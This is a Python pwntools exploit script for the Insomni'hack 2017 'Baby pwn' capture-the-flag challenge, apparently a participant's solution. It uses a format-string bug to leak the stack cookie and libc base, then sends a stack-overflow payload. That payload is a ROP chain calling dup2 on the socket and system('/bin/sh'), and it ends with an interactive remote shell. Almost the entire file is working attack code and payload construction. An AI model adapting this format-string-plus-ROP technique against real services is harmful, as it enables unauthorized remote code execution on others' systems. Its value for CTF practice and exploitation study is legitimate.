#!/usr/bin/env python
# -*- coding: utf-8 -*-
# pasteBin
#
# Insomni'hack 2017 Baby pwn
# local works, remote does not
# format string to leak blocks and cookie
# stack overflow to rop chain dup(4,0) dup(4,1) system("/bin/sh")


import sys
from pwn import *

with open('payload', 'w') as f:
	f.write('')


def send(conn, line):
	"""
		send a line to the program
		but also save it to 'payload'
		so we can recreate later
	"""
	conn.sendline(line)
	with open('payload', 'a') as f:
		line += '\x0a'
		f.write(line)

local = True
my_sock = 4

if len(sys.argv) == 2:
	local = False
	my_sock = int(sys.argv[1])


off2ref = lambda off: off/8 + 4
# run the process
conn = {}
libc = {}
leak_off = {}
j_set = 0
code_leak = 0
if local:
	conn = remote("127.0.0.1", 1337)
	libc = elf.ELF("/lib/x86_64-linux-gnu/libc-2.24.so")
	leak_off =  list(libc.search(p64(0xd001200003eba)))[0] # local

	code_offset = off2ref(104)
else:
	conn = remote("baby.teaser.insomnihack.ch", 1337)
	libc = elf.ELF("libc.so")
	leak_off =  list(libc.search(p64(0xd001200003e92)))[0] #live
	j_set = 8 # this is shifed down 8 bytes on their server, dunno why, just works
	code_offset = off2ref(400) + 9

welcome = conn.recvuntil('Your choice >')
print welcome,


send(conn, "2") # select format string
conn.recvuntil("Your format >")

def deref_offset(offset):
	payload = "%{ref}$llx".format(ref=offset)
	send(conn, payload)
	leak = int(conn.recvuntil("\n"), 16)
	conn.recvuntil("Your format >")
	return leak

# get the cookie
cookie = deref_offset(off2ref(1072))
libc.address = deref_offset(off2ref(112) + j_set) - leak_off

system = libc.symbols['system']
dup2 =   libc.symbols['dup2']
puts =   libc.symbols['puts']
fflush = libc.symbols['fflush']
printf = libc.symbols['printf']



rop_n_pop_rdi = libc.address + 0x21102 
rop_n_pop_rsi = libc.address + 0x202e8 

binsh = deref_offset(1) + 7 # why not, should have big buffer of '\n's



print "the cookie is: " + hex(cookie)
print "system is at : " + hex(system)
print "/bin/sh is at : " + hex(binsh)
print "rop gadget rdi is at : " + hex(rop_n_pop_rdi)
print "rop gadget rsi is at : " + hex(rop_n_pop_rsi)




payload = "\n"*10 +  "/bin/sh\n%s" # add one for the newline
send(conn, payload)

payload = ""

payload += "/bin/sh\n"*129
payload +=  p64(cookie)		# stack cookie		  
payload +=  "/bin/sh\n" #p64(0x7fffdae9bae0 - k_binsh + binsh)	

payload +=  p64(rop_n_pop_rdi)  # junnk 											
payload +=  p64(4) 	

payload +=  p64(rop_n_pop_rsi) 										
payload +=  p64(0) # the file descriptor of stdin 							 
payload +=  p64(dup2) 	 	


payload +=  p64(rop_n_pop_rsi) 											
payload +=  p64(2)  # stdout										
payload +=  p64(dup2) # dup2(my_sock, stdout)

payload +=  p64(rop_n_pop_rsi) 											
payload +=  p64(1)  # stdout										
payload +=  p64(dup2) # dup2(my_sock, stdout)	

payload +=  p64(rop_n_pop_rdi)  # junnk 											
payload +=  p64(binsh) 																								
payload +=  p64(system)  

conn.send('\n')
conn.recvuntil('Your choice > ')
conn.sendline('1')
conn.recvuntil("How much bytes you want to send ? ")
a = str(len(payload))
conn.send(a + (10-len(a))*'\x00')
conn.send(payload)
 
# we get a shell
conn.interactive()
conn.close()

